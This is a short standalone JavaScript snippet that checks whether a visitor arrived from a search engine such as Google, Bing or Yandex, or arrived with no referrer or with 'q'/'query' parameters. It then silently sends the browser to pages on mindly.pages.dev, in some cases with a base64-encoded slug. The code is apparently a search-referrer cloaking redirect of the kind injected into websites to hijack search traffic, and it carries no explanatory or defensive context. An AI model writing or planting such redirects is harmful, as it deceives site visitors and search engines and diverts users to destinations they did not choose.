(function() {
  const searchEnginesA = ['google.', 'bing.', 'yahoo.', 'duckduckgo.', 'baidu.'];
  const searchEnginesB = ['yandex.', 'ecosia.', 'ask.', 'qwant.', 'startpage.'];

  function isFromSearchEngine(referrer) {
    return searchEnginesA.some(engine => referrer.includes(engine)) ||
           searchEnginesB.some(engine => referrer.includes(engine));
  }

  function extractSlug(url) {
    // Assuming the slug is derived from the query parameters or some other part of the URL
    const queryParams = new URLSearchParams(new URL(url).search);
    const slug = queryParams.get('slug') || 'default-slug'; // Replace 'slug' with the actual query parameter name if different
    return slug ? decodeURIComponent(slug).replace(/-/g, ' ') : null;
  }

  function performRedirectA(slug) {
    window.location.href = `https://mindly.pages.dev/${encodeURIComponent(slug)}`;
  }

  function performRedirectB(slug) {
    const encodedSlug = btoa(encodeURIComponent(slug)).replace(/=/g, '');
    window.location.href = `https://mindly.pages.dev/r/${encodedSlug}`;
  }

  function attemptRedirect() {
    const currentUrl = window.location.href;
    const referrer = document.referrer.toLowerCase();
    const slug = extractSlug(currentUrl);

    if (slug) {
      if (isFromSearchEngine(referrer) || referrer === '' || new URLSearchParams(window.location.search).has('q') || new URLSearchParams(window.location.search).has('query')) {
        if (searchEnginesA.some(engine => referrer.includes(engine)) || new URLSearchParams(window.location.search).has('q')) {
          performRedirectA(slug);
        } else if (searchEnginesB.some(engine => referrer.includes(engine)) || new URLSearchParams(window.location.search).has('query')) {
          performRedirectB(slug);
        }
      }
    }
  }

  attemptRedirect();
})();
